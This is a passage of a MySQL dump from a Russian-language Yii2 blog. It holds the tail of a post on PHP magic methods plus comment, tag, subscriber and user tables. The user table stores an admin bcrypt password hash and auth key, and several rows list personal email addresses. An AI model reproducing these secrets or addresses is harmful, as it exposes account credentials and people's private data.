style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__toString &ndash; метод, с помощью которого можно обращаться к классу как к строке (например, с&nbsp;</span><span style="font-size:18px">помощью print или echo);</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__set_state &ndash; метод, который вызывается для классов, экспортирующих значения свойств функ</span><span style="font-size:18px">цией var_export();</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__clone &ndash; вызывается при клонировании объекта (введен для использования из-за того, что объ</span><span style="font-size:18px">екты в php5 и выше передаются по ссылке);</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__invoke &ndash; вызывается при попытке использовать объект в качестве функции.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n</div>\r\n', '2022-09-14 14:10:11', '2022-09-21 16:32:02', 'Admin', '4242d9916dfb8151ce20.jpg', 0, 17);
/*!40000 ALTER TABLE `blog` ENABLE KEYS */;

-- Дамп структуры для таблица yii2blogs.blogcomment
CREATE TABLE IF NOT EXISTS `blogcomment` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `blog_id` bigint DEFAULT NULL,
  `username` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `email` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `text` text COLLATE utf8mb4_general_ci,
  `create_comm` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `blog_id` (`blog_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Дамп данных таблицы yii2blogs.blogcomment: ~6 rows (приблизительно)
/*!40000 ALTER TABLE `blogcomment` DISABLE KEYS */;
INSERT INTO `blogcomment` (`id`, `blog_id`, `username`, `email`, `text`, `create_comm`) VALUES
	(1, 23, 'тест', 'email@mail.ru', 'Текст, текст, текст, текст', '2022-09-15 13:49:07'),
	(2, 23, 'ТЕСТ2', '1@2.ru', 'Сообщение', '2022-09-15 13:49:37'),
	(3, 4, 'Андрей', 'integralal@mail.ru', 'Проверка связи, как заполняется поле теста для комментариев. Тут будет много комментариев. Люди буду комментировать блоги и заполнять их своими пометками, мыслями, обмениваться опытом в программировании', '2022-09-19 13:38:37'),
	(4, 22, 'Андрей', 'integralal@mail.ru', 'Валидация форм должна быть успешной.', '2022-09-21 12:50:27'),
	(5, 22, 'Андрей', 'integralal@mail.ru', 'Можно делать валидацию форм через работу со стилями. Обрамлять красным цветом неверные поля, либо писать какой-либо комментарий об ошибке поля', '2022-09-21 12:54:25'),
	(6, 22, 'Володя', 'rambler-ru@mail.ru', 'Полезная статья, пригодится для новичков', '2022-09-21 13:15:16');
/*!40000 ALTER TABLE `blogcomment` ENABLE KEYS */;

-- Дамп структуры для таблица yii2blogs.blogtags
CREATE TABLE IF NOT EXISTS `blogtags` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `blog_id` bigint DEFAULT NULL,
  `tag_id` bigint DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `blog_id` (`blog_id`),
  KEY `tag_id` (`tag_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Дамп данных таблицы yii2blogs.blogtags: ~4 rows (приблизительно)
/*!40000 ALTER TABLE `blogtags` DISABLE KEYS */;
INSERT INTO `blogtags` (`id`, `blog_id`, `tag_id`) VALUES
	(1, 1, 1),
	(2, 1, 5),
	(3, 1, 12),
	(4, 2, 3);
/*!40000 ALTER TABLE `blogtags` ENABLE KEYS */;

-- Дамп структуры для таблица yii2blogs.subscribe
CREATE TABLE IF NOT EXISTS `subscribe` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `email` varchar(100) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Дамп данных таблицы yii2blogs.subscribe: ~0 rows (приблизительно)
/*!40000 ALTER TABLE `subscribe` DISABLE KEYS */;
INSERT INTO `subscribe` (`id`, `email`, `create_at`) VALUES
	(1, 'integralal@mail.ru', '2022-09-21 15:31:36'),
	(3, 'm1@mail.ru', '2022-09-21 15:47:59'),
	(4, 'l1@mail.com', '2022-09-21 15:50:12'),
	(12, 'l1@mail.com', '2022-09-21 16:18:31'),
	(13, 'm222@rambler.ru', '2022-09-21 16:32:30');
/*!40000 ALTER TABLE `subscribe` ENABLE KEYS */;

-- Дамп структуры для таблица yii2blogs.tags
CREATE TABLE IF NOT EXISTS `tags` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `tag` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Дамп данных таблицы yii2blogs.tags: ~24 rows (приблизительно)
/*!40000 ALTER TABLE `tags` DISABLE KEYS */;
INSERT INTO `tags` (`id`, `tag`) VALUES
	(1, 'Программирование'),
	(2, 'PHP'),
	(3, 'Delphi'),
	(4, 'JavaScript'),
	(5, 'JQuery'),
	(6, 'SQL'),
	(7, 'PL/SQL'),
	(8, 'Modx'),
	(9, 'Битрикс'),
	(10, 'Yii2'),
	(11, 'laravel'),
	(12, 'Git'),
	(13, 'MySQL'),
	(14, 'MS SQL'),
	(15, 'Oracle'),
	(16, 'PostgreSQL'),
	(17, 'Собеседование'),
	(18, 'Опыт'),
	(19, 'Справочник'),
	(20, 'Веб-программирование'),
	(21, 'web-программирование'),
	(22, 'web-дизайн'),
	(23, 'HTML'),
	(24, 'CSS');
/*!40000 ALTER TABLE `tags` ENABLE KEYS */;

-- Дамп структуры для таблица yii2blogs.user
CREATE TABLE IF NOT EXISTS `user` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `username` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `auth_key` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Дамп данных таблицы yii2blogs.user: ~1 rows (приблизительно)
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` (`id`, `username`, `password`, `auth_key`) VALUES
	(1, 'admin', '$2y$13$EpNAb/8KbhJcRZjq/p7W9OE8hsU6hYWWFdZzqpuJrQkfmqLEvmDBK', 'QmzOuSrjQzHFKOpYqD1NYGhgPOjQM-bI');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;

/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IFNULL(@OLD_FOREIGN_KEY_CHECKS, 1) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40111 SET SQL_NOTES=IFNULL(@OLD_SQL_NOTES, 1) */;
